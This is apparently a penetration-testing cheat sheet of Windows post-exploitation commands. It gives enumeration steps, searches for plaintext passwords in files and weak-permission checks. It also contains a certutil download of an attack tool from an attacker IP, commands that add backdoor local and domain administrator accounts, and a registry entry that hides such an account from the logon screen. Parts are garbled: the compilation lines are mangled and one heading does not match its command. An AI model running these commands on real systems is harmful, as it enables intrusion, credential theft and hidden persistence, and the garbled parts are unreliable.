## users and groups
```
whoami /all
net users
net localgroup
net user <username>
net localgroup administrators
```
## network status
```
netstat -anoy
route print
arp -A
```
## firewall
```
netsh advfirewall firewall show rule name=all
netsh advfirewall firewall show rule name=inbound
netsh advfirewall firewall show rule name=outbounD
netsh firewall show state
netsh firewall show config
```
## scheduled tasks
```
schtasks /query /fo LIST /v > schtasks.txt
```
## find passwords
```
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
dir /s pass == cred == vnc == .config
findstr /spin "password" .
```
## windows shares
```
NET SHARE
NET USE
--> CREATE A SHARE ON WINDOWS FROM THE COMMAND LINE:
NET SHARE <sharename>=<drive/folderpath> /remark: "This is my share."
--> MOUNT A WINDOWS SHARE FROM THE COMMAND LINE:
NET USE Z: [\\COMPUTER_NAME\SHARE_NAME](file://COMPUTER_NAME/SHARE_NAME) /PERSISTENT:YES
--> UNMOUNT SHARE:
NET USE Z: /DELETE
--> DELETE A SHARE ENTIRLE
NET SHARE /DELETE
```
## Find weak file permissions
```
accesschk.exe -uwqs Users c:*.*
```

A part of group "Authenticated Users" - you would be surprised if you have a real user.

```
accesschk.exe -uwqs "Authenticated Users" c:*.*
```
## Add Administrator Account
```
cmd.exe /c net user c1dn3y superPassword /add
cmd.exe /c net localgroup administrators c1dn3y /add
cmd.exe /c net localgroup "Remote Desktop Users" c1dn3y /add
```
## Add a Windows Domain Administrator
```
cmd.exe /c net user hacker superPassword /add
net localgroup Administrators hacker /ADD /DOMAIN
net localgroup "Remote Desktop Users" hacker /ADD /DOMAIN
net group "Domain Admins" hacker /ADD /DOMAIN
net group "Enterprise Admins" hacker /ADD /DOMAIN
net group "Schema Admins" hacker /ADD /DOMAIN
net group "Group Policy Creator Owners" hacker /ADD /DOMAIN
```
## Access Check enumeration
```
accesschk.exe /accepteula (always do this first!!!!!)
accesschk.exe -ucqv [service_name] (requires sysinternals accesschk!)
accesschk.exe -uwcqv "Authenticated Users" * (won't yield anything on Win 8)
accesschk.exe -ucqv [service_name]
#Find ALL weak folder permissions, per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwqs Users c:*.*
accesschk.exe -uwqs "Authenticated Users" c:*.*
```
## Code Compilation
```
apt-get install mingw-w64

Cross-Compilation Reference:
Ci686-w64-mingw32-gcc hello.c -o hello32.exe
32-bitx86_64-w64-mingw32-gcc hello.c -o hello64.exe
64-bit # C++i686-w64-mingw32-g++ hello.cc -o hello32.exe
32-bitx86_64-w64-mingw32-g++ hello.cc -o hello64.exe # 64-bit
```

## hotfixes
```
wmic qfe list
```

## file transfer
```
certutil -urlcache -f -split http://10.10.14.63:4321/SharpUp.exe sharpup.exe
```

## Enable RDP 

```
net user /add hacker Password123!! 
net localgroup administrators hacker /add
net localgroup "Remote Desktop Users" hacker /add 
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes 
```

```
reg add HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList /v hacker /t REG_DWORD /d 0
```

## Disable Firewall

```
Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' -name "fDenyTSConnections" -value 0
```

